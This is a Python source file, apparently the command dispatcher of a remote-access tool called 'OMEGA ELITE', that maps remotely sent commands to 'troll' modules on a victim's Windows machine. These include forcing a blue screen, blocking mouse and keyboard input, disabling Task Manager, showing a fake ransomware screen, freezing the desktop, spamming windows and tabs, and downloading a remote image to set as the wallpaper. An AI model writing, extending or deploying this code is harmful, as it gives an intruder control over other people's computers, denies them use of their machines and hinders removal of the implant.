"""
OMEGA ELITE - Fun & Troll Modules Entry Point
Refactored into individual components for better maintainability.
"""

import asyncio

# Original fun.py components
from .trolls.jumpscare import js_manager, JumpscareManager
from .trolls.jumpscare_pro import jumpscare_qt
from .trolls.bsod import trigger_bsod
from .trolls.tts import speak_tts
from .trolls.msg import show_msg
from .trolls.block_input import block_mnk
from .trolls.cd_tray import cd_door
from .trolls.melt import melt_screen
from .trolls.donut import donut_smp
from .trolls.idiot import idiot_prank

# Newly extracted components from omega_core and extended_commands
from .trolls.screen_flip import flip_screen, restore_screen
from .trolls.cursor_lock import lock_cursor, unlock_cursor
from .trolls.minimize import minimize_all
from .trolls.volume import set_volume
from .trolls.ransom import fake_ransom
from .trolls.sound import play_loop, stop_all_sounds, play_base64_audio
from .trolls.anti_taskmgr import start_antitaskmgr, stop_antitaskmgr
from .trolls.spam import open_tabs_spam, notepad_spam
from .trolls.crazy_cursor import crazy_cursor

def troll_action(action, value, msg_full=None):
    """
    Central dispatcher for all troll actions.
    Routes commands to the appropriate modularized troll script.
    """
    if msg_full is None: msg_full = {}
    
    if action == "msg":
        show_msg(value)
    elif action == "tts":
        asyncio.create_task(asyncio.to_thread(speak_tts, value))
    elif action == "bsod":
        trigger_bsod()
    elif action == "jumpscare":
        js_manager.start(msg_full.get("image") or value, msg_full.get("sound") or msg_full.get("sound_url"))
    elif action == "jumpscare_pro":
        jumpscare_qt(msg_full.get("image") or value, msg_full.get("sound") or msg_full.get("sound_url"))
    elif action == "stop_js":
        js_manager.stop()
    elif action == "flipscreen":
        flip_screen()
    elif action == "stopflip":
        restore_screen()
    elif action == "cursorlock":
        lock_cursor()
    elif action == "cursorunlock":
        unlock_cursor()
    elif action == "minimize":
        minimize_all()
    elif action == "volume":
        try:
            set_volume(int(str(value).strip()))
        except: pass
    elif action == "mnk":
        block_mnk(True)
    elif action == "stopmnk":
        block_mnk(False)
    elif action == "notepadspam":
        notepad_spam()
    elif action == "cdopen":
        cd_door(True)
    elif action == "cdclose":
        cd_door(False)
    elif action == "melt":
        melt_screen()
    elif action == "donutsmp":
        donut_smp()
    elif action == "fake_update":
        from .trolls.fake_update import trigger_fake_update
        trigger_fake_update()
    elif action == "glitch":
        from .trolls.glitcher import trigger_screen_glitch
        trigger_screen_glitch()
    elif action == "freeze":
        from .trolls.freezer import freeze_desktop
        freeze_desktop()
    elif action == "unfreeze":
        from .trolls.freezer import unfreeze_desktop
        unfreeze_desktop()
    elif action == "idiot":
        idiot_prank(True)
    elif action == "stopidiot":
        idiot_prank(False)
    elif action == "fakeransom":
        fake_ransom()
    elif action == "loopsound":
        play_loop(str(value))
    elif action == "stopsound":
        stop_all_sounds()
    elif action == "audio_data":
        play_base64_audio(str(value), msg_full.get("fname", "audio.mp3"))
    elif action == "audio_chunk":
        # Global dictionary to store chunks across calls
        if not hasattr(troll_action, "_audio_chunks"):
            troll_action._audio_chunks = {}
        
        fname = msg_full.get("fname", "audio.mp3")
        seq = int(msg_full.get("seq", 0))
        total = int(msg_full.get("total", 1))
        
        if fname not in troll_action._audio_chunks:
            troll_action._audio_chunks[fname] = [None] * total
            
        troll_action._audio_chunks[fname][seq] = str(value)
        
        # If all chunks received
        if all(c is not None for c in troll_action._audio_chunks[fname]):
            full_b64 = "".join(troll_action._audio_chunks[fname])
            play_base64_audio(full_b64, fname)
            del troll_action._audio_chunks[fname]
    elif action == "antitaskmgr":
        start_antitaskmgr()
    elif action == "stopantitaskmgr":
        stop_antitaskmgr()
    elif action == "crazycursor" or action == "crazywindow":
        crazy_cursor()
    elif action == "openspam":
        open_tabs_spam(str(value), int(msg_full.get("count", 10)))
    elif action == "wallpaper":
        from .trolls.ransom import fake_ransom # Reuse wallpaper logic or implement separately
        import urllib.request, tempfile, os, ctypes
        def _wp():
            try:
                fd, p = tempfile.mkstemp(suffix='.jpg'); os.close(fd)
                urllib.request.urlretrieve(str(value), p)
                ctypes.windll.user32.SystemParametersInfoW(20, 0, p, 3)
            except: pass
        import threading
        threading.Thread(target=_wp, daemon=True).start()

# Maintain CLI compatibility if run directly
if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        cmd = sys.argv[1]
        if cmd == "bsod": trigger_bsod()
        if cmd == "msg" and len(sys.argv) > 2: show_msg(sys.argv[2])
        if cmd == "melt": melt_screen()
        if cmd == "flip": flip_screen()
        if cmd == "restore": restore_screen()
